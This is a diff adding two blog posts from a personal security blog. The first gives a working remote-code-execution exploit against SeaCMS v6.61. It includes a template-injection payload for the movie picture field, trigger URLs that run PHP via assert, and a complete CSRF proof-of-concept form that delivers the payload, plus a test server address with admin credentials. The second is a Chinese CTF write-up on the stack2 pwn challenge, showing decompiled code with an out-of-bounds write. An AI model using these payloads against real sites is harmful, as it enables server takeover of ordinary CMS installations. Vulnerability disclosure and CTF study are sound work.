@@ -317,6 +317,377 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/seacms-backend-getshell/index.html" itemprop="url">
+                  seacms backend getshell
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-07-18 11:30:58" itemprop="dateCreated datePublished" datetime="2018-07-18T11:30:58+08:00">2018-07-18</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="backend-RCE-in-the-latest-version-of-SeaCMS-v6-61"><a href="#backend-RCE-in-the-latest-version-of-SeaCMS-v6-61" class="headerlink" title="backend RCE in the latest version of SeaCMS(v6.61)"></a>backend RCE in the latest version of SeaCMS(v6.61)</h1><p>In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.<br>So How does this vul be triggerd? here are some Steps:  </p>
+<ul>
+<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt=""></li>
+<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt=""></li>
+<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt=""></li>
+<li>Or you can just visit <code>/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code>or any other places that display the video’s pic you have just added.</li>
+</ul>
+<p>Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.<br>csrf poc is here:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- adjust action to your url --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;name"</span> <span class="attr">value</span>=<span class="string">"getshell"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;enname"</span> <span class="attr">value</span>=<span class="string">"ceshi"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;color"</span> <span class="attr">value</span>=<span class="string">"&amp;#35;FF0000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;type"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;state"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;pic"</span> <span class="attr">value</span>=<span class="string">"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;spic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;gpic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;actor"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;director"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;note"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tags"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select3"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publishyear"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select2"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;lang"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select1"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publisharea"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select4"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;ver"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;hit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;monthhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;weekhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;dayhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;len"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;total"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;nickname"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;company"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tvs"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;douban"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;mtime"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;imdb"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;score"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;scorenum"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;longtxt"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;money"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;psd"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>you can test this vul at <code>http://111.230.11.248:10089/backend/</code>,and the username and password is admin|admin.</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html" itemprop="url">
+                  pwn的初体验-qctf Xman-stack2 writeup
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-07-15 22:55:05" itemprop="dateCreated datePublished" datetime="2018-07-15T22:55:05+08:00">2018-07-15</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>昨天去打了打QCTF，水了3道web题目后便草草收场。表示这场比赛真的只是一场萌新赛吗。。。。由于队伍里面向来缺pwn手，所以便计划把这场比赛的pwn题目也做一下练练手，限于水平太菜也就做了个stack2这道题。</p>
+</blockquote>
+<h2 id="分析程序利用点"><a href="#分析程序利用点" class="headerlink" title="分析程序利用点"></a>分析程序利用点</h2><p>首先 checksec查看程序的保护情况<br><img src="http://p7lc13qga.bkt.clouddn.com/checksec.png" alt="checksec"><br>可以卡暗道开启了栈不可执行保护和CANARY。<br>先把程序拖到IDA里面然后F5大法好。。。得到main函数的伪代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>分析程序可以看出程序的逻辑大体是输入一堆数，然后可以求平均值，也可以添加数字，或者更改某一位。数字默认被存入一个数组中。其中在更改某一位数字的操作中可以看到并没有被传入的下标做检测，这就导致了我们可以在任意位置写入数据，从而更改掉main函数的返回地址从而实现getshell。而且这里存在一个hackhere函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
